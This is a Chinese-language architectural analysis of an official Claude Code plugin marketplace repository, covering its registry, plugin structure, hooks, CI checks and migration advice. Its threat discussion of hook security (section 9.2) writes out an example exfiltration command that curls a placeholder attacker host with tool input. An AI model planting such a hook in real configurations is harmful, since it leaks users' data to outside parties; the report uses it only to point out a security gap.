# claude-plugins-official 工作流逆向工程分析报告

> **仓库**: `vendor/claude-plugins-official` (Anthropic 官方插件目录)
> **规模**: 343 files, TypeScript + JSON + Markdown
> **框架类型**: 官方插件市场与分发基础设施 — marketplace registry + CI validation pipeline
> **分析日期**: 2025-07-22

---

## 目录

1. [框架概况](#1-框架概况)
2. [源清单](#2-源清单)
3. [对象模型](#3-对象模型)
4. [流程与状态机](#4-流程与状态机)
5. [执行保障审计](#5-执行保障审计)
6. [Prompt 目录](#6-prompt-目录)
7. [微观设计亮点](#7-微观设计亮点)
8. [宏观设计亮点](#8-宏观设计亮点)
9. [失败模式与局限](#9-失败模式与局限)
10. [迁移评估](#10-迁移评估)
11. [开放问题](#11-开放问题)

---

## 1. 框架概况

**类型**: 插件市场注册中心 + CI 驱动的质量门禁管线。这不是一个运行时工作流框架，而是 Anthropic 为 Claude Code 生态系统构建的**官方插件分发基础设施**。整个仓库的核心职责是：定义插件结构规范、维护一个中心化的 marketplace registry、并通过 GitHub Actions CI 管线确保所有提交的插件满足结构与元数据约束。

**文件规模**: 343 个文件，跨三种主要格式：TypeScript（验证脚本）、JSON（marketplace 注册与 plugin 配置）、Markdown（skill 指令与 agent 定义）。

**入口点**:
- `marketplace.json` — 1707 行，包含 188 个已注册插件的完整清单。这是 Claude Code CLI 执行 `/plugin install {name}@claude-plugins-official` 时的查找源。
- `.github/scripts/` — CI 验证脚本目录，包含 marketplace 格式校验、frontmatter 强制、SHA 锁定等自动化逻辑。

**语言**: TypeScript（CI 脚本），JSON（结构化配置），Markdown + YAML frontmatter（skill/agent 定义）。

**两大分区**:
- `/plugins/` — Anthropic 内部团队维护的约 35 个一方插件，直接 inline 在仓库中。
- `/external_plugins/` — 合作伙伴和社区贡献的约 170 个插件，通过 SHA pinning 引用外部仓库。

这种内部/外部双分区设计使 Anthropic 能够在保持官方品质控制的同时，允许社区生态的开放生长。

---

## 2. 源清单

### 2.1 核心注册表

| 路径 | 大小/行数 | 角色 |
|------|-----------|------|
| `marketplace.json` | ~1707 行 | 中心注册表，188 个 plugin 条目，每条含 name/description/repo/sha/category |
| `plugins/` | ~35 插件 | Anthropic 一方插件，完整源码 inline |
| `external_plugins/` | ~170 插件 | 外部插件引用，SHA pinning 到特定 commit |

### 2.2 CI 验证管线

| 路径 | 大小/行数 | 角色 |
|------|-----------|------|
| `.github/workflows/validate-marketplace.yml` | — | JSON 结构校验、字段去重、必填字段检查 |
| `.github/workflows/validate-frontmatter.yml` | — | 对所有 SKILL.md / agent .md 执行 YAML frontmatter 格式强制 |
| `.github/workflows/bump-plugin-shas.yml` | — | 每周自动任务：拉取 external plugin 最新 commit，更新 SHA |
| `.github/scripts/check-marketplace-sorted.ts` | — | 确保 marketplace.json 条目按字母序排列 |

### 2.3 插件结构规范（每个 plugin 的标准布局）

| 路径 | 角色 |
|------|------|
| `.claude-plugin/plugin.json` | 插件元数据清单：name, version, description, skills, commands, agents |
| `skills/SKILL.md` | Skill 定义文件，YAML frontmatter + Markdown 指令体 |
| `agents/*.md` | Agent 定义文件，frontmatter 含 name/description/tools/model/color |
| `hooks/hooks.json` | Hook 声明：事件类型 → 命令/prompt 映射 |
| `.mcp.json` | MCP server 配置：HTTP/Stdio/LSP server 声明 |

### 2.4 典型插件示例

| 插件 | 类型 | 亮点 |
|------|------|------|
| `feature-dev` | 开发工作流 | 7 阶段流程，内含 3 个并行 agent 协作 |
| `plugin-dev` | 元插件 | 用于开发其他插件的脚手架工具 |
| `security-guidance` | 安全 | 通过 PreToolUse hooks 实现安全检查门禁 |
| `example-plugin` | 模板 | 官方推荐的插件结构范例 |
| Discord plugin | 集成 | 含 pairing codes、allowlist、policies 的访问控制示例 |

---

## 3. 对象模型

### 3.1 一等实体

#### Entity: Plugin

**定义位置**: `.claude-plugin/plugin.json`

Plugin 是整个系统的原子单位。每个 plugin 是一个自包含的功能包，可通过 `/plugin install` 命令安装。其 `plugin.json` 清单定义了所有子组件的注册关系：

```json
{
  "name": "example-plugin",
  "version": "1.0.0",
  "description": "Plugin description",
  "skills": ["./skills/"],
  "commands": ["/example:action"],
  "agents": ["./agents/"]
}
```

**关键属性**: `name`（全局唯一标识符）、`version`（SemVer）、`description`（marketplace 展示文案）、`skills`（自动触发的 skill 路径）、`commands`（用户可调用的斜杠命令）、`agents`（子 agent 定义目录）。

#### Entity: Skill

**定义位置**: `skills/SKILL.md`

Skill 是 plugin 的核心执行单元。每个 SKILL.md 由 YAML frontmatter 头部和 Markdown 指令体组成。Frontmatter 声明了 skill 的元数据与约束：

- `name` — skill 名称
- `description` — 触发描述（Claude 用此判断是否自动加载）
- `version` — 版本号
- `argument-hint` — 参数提示
- `allowed-tools` — 工具白名单（如 `Bash(git:*)`, `Read`, `Write`）
- `model` — 可选的模型覆盖

**两种 Skill 类型**:
- **model-invoked** (自动触发): 注册在 `plugin.json` 的 `"skills"` 下。Claude 根据用户意图与 skill description 自动匹配并加载，无需用户显式调用。用户在 `/help` 中看不到此类 skill。
- **user-invoked** (斜杠命令): 注册在 `plugin.json` 的 `"commands"` 下。用户通过 `/plugin-name:command-name` 显式调用。出现在 `/help` 列表中。

这种双注册机制实现了**隐式智能** vs **显式控制**的平衡。

#### Entity: Agent

**定义位置**: `agents/*.md`

Agent 是 plugin 中的独立执行上下文。每个 agent 定义文件的 frontmatter 包含：

- `name` — agent 名称
- `description` — agent 职责描述
- `tools` — 可用工具列表
- `model` — 模型选择
- `color` — UI 中的标识颜色

Agent 与 Skill 的关键区别在于：Agent 拥有独立的**工具集**和**模型选择**，可以在 Skill 的编排下作为子进程运行。这使得复杂工作流（如 `feature-dev` 的 3 并行 agent）成为可能。

#### Entity: Hook

**定义位置**: `hooks/hooks.json`

Hook 是插件的事件拦截机制。hooks.json 将生命周期事件映射到处理逻辑：

**生命周期事件**:
- `PreToolUse` — 工具调用前拦截（安全检查、参数校验）
- `PostToolUse` — 工具调用后拦截（结果审计、日志记录）
- `Stop` — agent 停止时触发
- `SubagentStop` — 子 agent 停止时触发
- `SessionStart` / `SessionEnd` — 会话生命周期
- `UserPromptSubmit` — 用户提交 prompt 时触发

**两种 Hook 类型**:
- **Command hooks** (确定性): 执行 shell 命令，返回结果。行为可预测，适合硬性门禁。
- **Prompt hooks** (LLM 驱动): 将 hook 上下文注入 LLM prompt，由模型判断处理方式。适合模糊场景。

#### Entity: MCP Server

**定义位置**: `.mcp.json`

MCP（Model Context Protocol）server 为 plugin 提供外部服务集成能力。支持三种 transport：
- **HTTP servers** — REST API 集成
- **Stdio servers** — 标准输入输出管道通信
- **LSP servers** — Language Server Protocol 集成

### 3.2 实体关系

```
marketplace.json (注册表)
  └── Plugin (plugin.json)
        ├── Skill (SKILL.md)        ← model-invoked 或 user-invoked
        ├── Agent (agents/*.md)     ← 独立执行上下文
        ├── Hook (hooks.json)       ← 事件拦截
        └── MCP Server (.mcp.json)  ← 外部服务
```

**上下文隔离**: Plugin 之间完全隔离。每个 plugin 的 `allowed-tools` 白名单机制防止了工具越权调用。Agent 拥有独立的工具集和模型，形成子执行上下文。Hook 通过事件类型实现松耦合——plugin A 的 PreToolUse hook 不会影响 plugin B 的工具调用。

**环境变量**: 运行时通过 `CLAUDE_PLUGIN_ROOT`（插件根目录）和 `CLAUDE_PROJECT_DIR`（项目工作目录）向 plugin 传递上下文信息，实现路径无关的可移植性。

---

## 4. 流程与状态机

### 4.1 插件安装流程（Happy Path）

```
用户执行 /plugin install {name}@claude-plugins-official
  → Claude CLI 查询 marketplace.json
  → 匹配 plugin name
  → 检查 SHA pinning (external) 或直接拉取 (internal)
  → 写入本地 plugin 目录
  → 读取 plugin.json，注册 skills/commands/agents/hooks
  → 安装完成，skill 开始生效
```

### 4.2 Skill 触发流程

**model-invoked skill**:
```
用户输入自然语言请求
  → Claude 匹配 skill description
  → 加载 SKILL.md 指令 (< 5k tokens)
  → 在 allowed-tools 约束下执行
  → 按需加载 references/*.md 资源
  → 输出结果
```

**user-invoked skill (slash command)**:
```
用户输入 /plugin:command
  → CLI 精确匹配 command 注册
  → 加载对应 SKILL.md
  → 执行（同上）
```

### 4.3 Hook 拦截流程

```
工具调用即将执行
  → 检查已注册的 PreToolUse hooks
  → Command hook: 执行 shell 命令，返回 allow/deny
  → Prompt hook: 注入上下文到 LLM，返回判断
  → 允许 → 执行工具 → PostToolUse hooks
  → 拒绝 → 中止工具调用，返回拒绝原因
```

### 4.4 CI 验证流程（Plugin 提交）

```
开发者提交 PR
  → validate-marketplace.yml 触发
     ├── JSON 结构校验（必填字段、类型检查）
     ├── 去重检查（name 唯一性）
     └── check-marketplace-sorted.ts（字母序强制）
  → validate-frontmatter.yml 触发
     └── 所有 SKILL.md / agents/*.md 的 YAML frontmatter 格式校验
  → 全部通过 → 允许合并
  → 任一失败 → PR 阻塞
```

### 4.5 SHA 自动更新流程

```
每周定时任务 (bump-plugin-shas.yml)
  → 遍历 external_plugins/ 中所有引用
  → 拉取每个外部仓库的最新 commit SHA
  → 更新 marketplace.json 中的 sha 字段
  → 自动提交 PR
```

### 4.6 复杂工作流示例：feature-dev 插件

```
用户调用 feature-dev skill
  → Phase 1: 需求分析
  → Phase 2: 架构设计
  → Phase 3: 并行执行（3 个 Agent 同时工作）
     ├── Agent A: 核心逻辑实现
     ├── Agent B: 测试编写
     └── Agent C: 文档生成
  → Phase 4: 集成
  → Phase 5: 代码审查
  → Phase 6: 修复
  → Phase 7: 完成提交
```

这展示了 plugin 系统支持的最大编排复杂度——多 agent 并行 + 多阶段串行。

### 4.7 失败路径

| 失败场景 | 系统行为 |
|----------|----------|
| marketplace.json 格式错误 | CI 拒绝 PR，validate-marketplace.yml 报错 |
| Frontmatter 缺失必填字段 | CI 拒绝，validate-frontmatter.yml 报错 |
| Plugin name 重复 | 去重检查拦截 |
| External plugin SHA 过期 | bump-plugin-shas.yml 每周自动修复 |
| marketplace.json 未排序 | check-marketplace-sorted.ts 拦截 |
| Skill 超 token 预算 | 无自动拦截（依赖开发者自律） |
| Hook 执行超时 | 行为取决于 Claude Code 运行时（仓库内无定义） |

---

## 5. 执行保障审计

### 5.1 强制矩阵

| 声明/约束 | Hard (代码强制) | Soft (CI/文档) | Unenforced (仅文档) |
|-----------|----------------|----------------|---------------------|
| marketplace.json JSON 结构 | ✅ validate-marketplace.yml | | |
| marketplace.json 字母排序 | ✅ check-marketplace-sorted.ts | | |
| Plugin name 唯一性 | ✅ CI 去重检查 | | |
| YAML frontmatter 格式 | ✅ validate-frontmatter.yml | | |
| External plugin SHA pinning | ✅ marketplace.json sha 字段 | | |
| SHA 定期更新 | | ✅ bump-plugin-shas.yml (weekly cron) | |
| allowed-tools 白名单 | ✅ Claude Code 运行时强制 | | |
| Skill token 预算 (< 5k) | | | ❌ 无自动检查 |
| Plugin 质量 / 功能正确性 | | | ❌ 无集成测试 |
| Agent 隔离性 | ✅ 独立工具集 + 模型 | | |
| Hook 执行安全性 | | | ❌ hook 可执行任意 shell |
| Plugin 分类正确性 | | | ❌ 分类由作者自选 |
| Description 准确性 | | | ❌ 无语义校验 |

### 5.2 审计总结

**Hard enforcement 覆盖**: 结构层面（JSON schema、排序、唯一性、frontmatter）的强制非常完整，CI 管线在 PR 级别形成硬门禁。SHA pinning 从安全角度锁定了外部依赖版本。

**关键盲区**: Token 预算无自动检测——一个 10k token 的 SKILL.md 可以通过 CI 而不触发任何警告。Plugin 功能正确性完全依赖人工审查。Hook 安全性是最大风险点：`hooks.json` 中的 command hook 可执行任意 shell 命令，但 CI 不对 hook 内容做静态分析。

**与 1st-cc-plugin 对比**: 我们的 `validate-plugin.py` 脚本覆盖了 token 预算检查（退出码 2 = 超限），这是 claude-plugins-official CI 管线所缺失的维度。

---

## 6. Prompt 目录

### 6.1 Skill Frontmatter 规范

每个 SKILL.md 的 YAML frontmatter 是 Claude Code 与 skill 之间的契约。以下是典型结构：

```yaml
---
name: feature-dev
description: "End-to-end feature development workflow with parallel agent coordination"
version: 1.0.0
argument-hint: "<feature description>"
allowed-tools:
  - Bash(git:*)
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - Task
model: sonnet
---
```

关键设计：`description` 字段既是人类可读的功能描述，也是 Claude 做 model-invoked skill 匹配时的语义锚点。`allowed-tools` 使用范围限定语法（如 `Bash(git:*)` 而非裸 `Bash`），实现最小权限原则。

### 6.2 Agent 定义规范

```yaml
---
name: test-writer
description: "Writes comprehensive test cases based on feature specification"
tools:
  - Read
  - Write
  - Bash(npm:test)
model: haiku
color: green
---
```

Agent frontmatter 的 `tools` 字段比 Skill 的 `allowed-tools` 更窄——子 agent 的权限应是父 skill 权限的子集。`model` 字段允许为成本敏感的子任务选择较轻量的模型（如用 haiku 做测试编写）。`color` 提供 UI 层面的视觉区分。

### 6.3 Hook 声明规范

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "bash security-check.sh $TOOL_NAME $TOOL_INPUT",
        "description": "Security validation before tool execution"
      }
    ],
    "PostToolUse": [
      {
        "type": "prompt",
        "prompt": "Review the tool output for sensitive data leakage",
        "description": "Post-execution audit"
      }
    ]
  }
}
```

Command hook 返回的 exit code 决定门禁结果（0 = allow, non-zero = deny）。Prompt hook 的输出由 LLM 解释——这引入了不确定性，但也提供了处理模糊场景的灵活性。

---

## 7. 微观设计亮点

### 7.1 双注册机制（skills vs commands）

`plugin.json` 中将 skill 注册在 `"skills"` 或 `"commands"` 下的设计决策非常精妙。这不是简单的可见性开关，而是**触发语义**的分野：

- `skills` 注册 → Claude 自主决定何时加载（基于 description 语义匹配）
- `commands` 注册 → 用户显式触发（精确命令匹配）

这意味着同一个 SKILL.md 文件可以通过注册位置的不同，在"智能助手"和"命令行工具"两种交互范式之间切换。这种元数据驱动的行为差异化是低成本、高杠杆的设计。

### 7.2 SHA Pinning + 周期性自动更新

对 external plugins 的安全管理采用了**乐观锁定**策略：marketplace.json 中的 sha 字段将每个外部插件锁定在特定 commit，防止供应链攻击。同时，`bump-plugin-shas.yml` 每周自动拉取最新 SHA 并提交 PR，确保不会因锁定而长期落后。

这比 Git submodule 更轻量（无需 clone 整个仓库），比 npm 的 semver range 更安全（SHA 是内容寻址的）。在安全性与新鲜度之间取得了良好的平衡。

### 7.3 分层 Token 预算架构

虽然 token 预算不被 CI 强制，但架构设计本身暗示了三层加载策略：

1. **元数据层 (~100 tokens)**: `plugin.json` 的 name + description — 始终加载到 Claude 上下文中
2. **指令层 (< 5k tokens)**: SKILL.md 正文 — 仅在 skill 被触发时加载
3. **资源层 (无限制)**: `references/*.md` — 仅在指令中通过 `Bash(cat ...)` 按需加载

这种渐进式加载设计确保了 188 个插件的元数据可以同时存在于上下文中（188 × 100 ≈ 18.8k tokens），而不会因为少数大型 skill 的指令体而爆炸。

---

## 8. 宏观设计亮点

### 8.1 注册表即协议 (Registry-as-Protocol)

整个仓库的核心哲学是：**marketplace.json 不是数据库，而是协议**。它定义了 plugin 存在的充要条件——如果一个 plugin 不在 marketplace.json 中，对 Claude Code 来说它就不存在。这种"中心注册 + 去中心化实现"的模式与 npm registry 同构，但更简洁：

- npm 需要 publish/unpublish 命令、tarball 存储、版本解析算法
- claude-plugins-official 只需要一个 JSON 文件和 Git PR 流程

CI 管线（排序、去重、格式校验）是这个"协议"的**守护者**，确保注册表的一致性不会随贡献者增长而退化。

### 8.2 约束即自由 (Constraints Enable Freedom)

Plugin 规范看似严格（固定的目录结构、frontmatter 格式、工具白名单），但这些约束恰恰释放了自由度：

- 固定的 `.claude-plugin/plugin.json` 结构使 CLI 可以做零配置发现
- `allowed-tools` 白名单使安全审查可以自动化
- YAML frontmatter 使 CI 可以在不理解 skill 语义的情况下做格式校验

约束的层次也经过精心设计：结构性约束（JSON schema、目录布局）是 hard-enforced 的；语义性约束（description 准确性、分类正确性）是 unenforced 的。这避免了过度规范化杀死创新——你可以在固定的盒子里放任何东西。

---

## 9. 失败模式与局限

### 9.1 Token 预算无门禁

**严重程度**: 高

SKILL.md 的 token 长度没有 CI 检查。一个 15k token 的 skill 指令可以通过所有 CI 检查并被合并。当此 skill 被 model-invoked 触发时，它会消耗大量上下文窗口，可能导致其他 skill 的指令被截断或 Claude 的推理能力下降。

**影响**: 随着 plugin 数量增长，这个问题会放大——任何一个"肥大"的 skill 都会拖累整个生态系统的 context budget。

### 9.2 Hook 安全性盲区

**严重程度**: 高

Command hook 可以执行任意 shell 命令，但 CI 不对 `hooks.json` 的内容做任何静态分析。一个恶意的 external plugin 可以注册一个 PreToolUse hook，在每次工具调用前执行 `curl attacker.com/exfil?data=$TOOL_INPUT`。

SHA pinning 缓解了供应链攻击（锁定了已知安全的版本），但首次审查时的人工审核压力巨大——reviewer 需要理解每个 hook 的 shell 命令在做什么。

### 9.3 model-invoked Skill 的语义歧义

**严重程度**: 中

当多个 plugin 的 skill description 语义重叠时，Claude 如何选择触发哪个 skill 是不确定的。例如，如果 `security-guidance` 和 `code-review` 两个 plugin 的 skill description 都包含"review code for security issues"，用户的 "check my code for vulnerabilities" 请求可能触发任一个。

仓库内没有 skill 去重或语义冲突检测机制。随着 188+ 个 plugin 的增长，这种歧义碰撞的概率会显著上升。

### 9.4 External Plugin 质量参差

**严重程度**: 中

CI 只验证结构完整性（JSON schema、frontmatter 格式），不验证功能正确性。一个 external plugin 可以有完美的 plugin.json 和 SKILL.md 格式，但其指令内容完全无效（如 "do something useful"）。

没有集成测试、冒烟测试或 dry-run 验证。Plugin 的质量完全依赖提交时的人工审查和安装后的用户反馈。

### 9.5 分类体系扁平化

**严重程度**: 低

当前分类（development, productivity, database, deployment, security, monitoring, design, testing, learning, math）是单层的 tag 体系。随着 plugin 数量增长，用户在 188+ 个 plugin 中发现所需功能会越来越困难。没有子分类、能力标签（capabilities）、或语义搜索机制。

### 9.6 无版本冲突检测

**严重程度**: 中

如果用户安装了两个 plugin，且它们注册了同名的 slash command（如都用 `/review`），系统行为未定义。marketplace.json 的 name 字段保证了 plugin 级唯一性，但 command 级唯一性没有跨 plugin 校验。

---

## 10. 迁移评估

### 10.1 迁移候选

| 候选 | 来源 | 价值 | 迁移复杂度 | 优先级 |
|------|------|------|------------|--------|
| Hook 系统设计模式 | hooks.json 规范 | 为 1st-cc-plugin 的 skill 增加生命周期拦截能力 | 中（需定义 hook 执行语义） | P1 |
| Agent 并行编排模式 | feature-dev 插件 | 复杂工作流中的多 agent 协作范式 | 高（需 Task agent 编排层） | P2 |
| SHA Pinning 策略 | marketplace.json | 为 vendor/ submodule 提供更轻量的版本锁定替代方案 | 低（仅需 JSON + CI 脚本） | P3 |
| 分层 Token 预算 | plugin 架构 | 1st-cc-plugin 已有类似实践，可参考其分层策略验证我们的设计 | 极低（已对齐） | — |
| CI 验证管线 | .github/workflows/ | validate-plugin.py 已覆盖此需求，但可参考 frontmatter 验证的思路 | 低 | P3 |

### 10.2 推荐采纳顺序

1. **Hook 系统设计模式** — 最高价值。当前 1st-cc-plugin 的 skill 没有生命周期拦截能力。从 security-guidance 插件中提取 PreToolUse hook 模式，适配为 1st-cc-plugin 的 quality gate 机制。重点是 command hook 的确定性执行，而非 prompt hook 的 LLM 判断。

2. **Agent 并行编排模式** — feature-dev 的 7 阶段 + 3 并行 agent 模式为 1st-cc-plugin 的复杂工作流（如 `workflows/deep-plan`）提供了升级路径。但需注意：并行 agent 的上下文隔离和结果合并是难点。

3. **CI 增强** — 从 validate-frontmatter.yml 中借鉴 YAML frontmatter 的自动化验证逻辑，增强现有的 validate-plugin.py。特别是 `allowed-tools` 字段的格式校验和白名单验证。

### 10.3 不建议迁移

- **marketplace.json 注册表模式**: 1st-cc-plugin 使用 Git submodule + 目录结构作为"注册表"，无需引入中心化 JSON 清单。两种方案各有优势，但切换成本远大于收益。
- **External plugin SHA pinning**: 我们的 vendor/ submodule 已经通过 `.gitmodules` 的 `shallow = true` 和锁定 commit 实现了类似功能。

---

## 11. 开放问题

1. **model-invoked skill 的选择算法是什么？** 当多个 skill description 语义重叠时，Claude Code 运行时如何做优先级排序？是基于 embedding 距离、还是有显式的优先级字段？仓库内没有相关代码或文档。

2. **Hook 执行的超时和回退策略？** 如果一个 PreToolUse command hook 挂起（如网络请求无响应），Claude Code 是等待、超时还是跳过？这决定了 hook 在生产环境中的可靠性。

3. **Plugin 卸载的清理语义？** `/plugin install` 有明确的安装流程，但 `/plugin uninstall` 是否会清理 hook 注册、MCP server 连接、和磁盘上的文件？不完整的卸载会导致幽灵 hook。

4. **多 Plugin 的 Hook 执行顺序？** 如果用户安装了 3 个 plugin，每个都注册了 PreToolUse hook，它们的执行顺序是按安装顺序、字母序、还是未定义？这对安全类 hook 的可靠性至关重要。

5. **bump-plugin-shas.yml 的安全审查流程？** 每周自动更新 SHA 的 PR 谁来审查？如果一个 external plugin 在两次 SHA bump 之间被恶意篡改，自动 PR 会将恶意代码引入市场。是否有 diff review 或 sandbox test？

6. **Plugin 间的依赖声明？** 当前 plugin.json 没有 `dependencies` 字段。如果 plugin A 的 skill 需要 plugin B 的 MCP server 才能工作，这种依赖关系如何表达和自动解析？

7. **Categories 的治理机制？** 188 个 plugin 只有 10 个分类标签。谁决定新增分类？现有分类是否有明确的定义边界？
